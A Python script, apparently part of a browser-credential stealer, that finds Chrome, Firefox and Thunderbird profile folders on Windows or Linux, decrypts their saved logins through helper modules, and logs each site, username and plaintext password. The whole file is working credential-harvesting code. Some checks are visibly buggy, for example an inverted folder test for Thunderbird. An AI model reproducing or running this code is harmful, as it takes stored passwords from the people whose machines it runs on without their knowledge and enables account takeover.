#!/usr/bin/python

####
### Collect browser files to be passed to the analyzer
##
#
##
###
####

import getpass, platform, os
import decrypter, logger
from credentials import Credentials

UNAME = getpass.getuser()
OP_SYS = platform.system()

TH_PROFILE_WIN = 'C:\\Users\\' + UNAME + "\AppData\Roaming\Thunderbird"
LIBNSS_WIN = "nss3.dll"

TH_PROFILE_LINUX = "/home/" + UNAME + "/.thunderbird"
LIBNSS_LINUX = "libnss3.so"

# firefox useful file
FF_PROFILE_WIN = 'C:\\Users\\' + UNAME + "\AppData\Roaming\Mozilla\Firefox"
FF_PROFILE_LINUX = "/home/" + UNAME + "/.mozilla/firefox"
COOKIES = "cookies.sqlite"
FORM_HISTORY = "formhistory.sqlite"
PLACES = "places.sqlite"
MOZ_LOGIN_FILE_DB = "signons.sqlite"
MOZ_LOGIN_FILE_JSON = "logins.json"

# chrome useful file
GCHROME_PROFILE_WIN = 'C:\Users\\' + UNAME + "\AppData\Local\Google\Chrome\User Data"
GCHROME_PROFILE_LINUX = "/home/" + UNAME + "/.config/google-chrome"
GCHROME_LOGIN_FILE = "Login Data"
BOOKMARKS = "Bookmarks"
COOKIES = "Cookies"
HISTORY = "History"
WEB_DATA = "Web Data"

#detect os and set profile folders
if OP_SYS == "Linux":
	chromeProfile = GCHROME_PROFILE_LINUX
	ffProfile = FF_PROFILE_LINUX
	thProfile = TH_PROFILE_LINUX
	libnss = LIBNSS_LINUX
elif OP_SYS == "Windows":
	chromeProfile = GCHROME_PROFILE_WIN
	ffProfile = FF_PROFILE_WIN
	thProfile = TH_PROFILE_WIN
	libnss = LIBNSS_WIN

def chromeFinder():
	""" Find useful file about google chrome """
	if not os.path.isdir(chromeProfile):
		logger.log("No google chrome profile folder found")

	chromeCred = decrypter.readChromeLogins(chromeProfile, OP_SYS)

	logger.log("\n === Credentials for chrome found: === ","no")

	for c in chromeCred:
		logger.log(c.hostname + ", " + c.username + ", " + c.password + ", " + c.profile )
		logger.log("=>" + c.signature)


def firefoxFinder():
	""" Find useful file about firefox """
	if not  os.path.isdir(ffProfile):
		logger.log("No firefox profile folder found")
	
	# look in all profiles
	os.chdir(ffProfile)
	cred = list()

	for profile in open("profiles.ini", "r"):
		#get profile dir
		if profile.startswith("Path="):
			p = profile.split("=")[1].strip("\n")
			logger.log("Found profile directory " + p)
			os.chdir(p)

			## passwords
			cred = cred + decrypter.getPasswords(MOZ_LOGIN_FILE_DB,p,libnss)
			cred = cred + decrypter.readLoginsJSON(MOZ_LOGIN_FILE_JSON, p, libnss)

			##useful file

	logger.log("\n === Credentials for firefox found: === ","no")

	for c in cred:
		logger.log(c.hostname + ", " + c.username + ", " + c.password + ", " + c.profile )
		logger.log("=>" + c.signature)



def thunderbirdFinder():
	""" Find useful file about thunderbird """

	if os.path.isdir(thProfile):
		logger.log("No thunderbird profile folder found")
	
	thCred = decrypter.readMozillaLogins("thunderbird",thProfile, libnss)

	logger.log("\n === Credentials for thunderbird found: === ","no")

	for c in thCred:
		logger.log(c.hostname + ", " + c.username + ", " + c.password + ", " + c.profile )
		logger.log("=>" + c.signature)


#chromeFinder()
firefoxFinder()
#thunderbirdFinder()
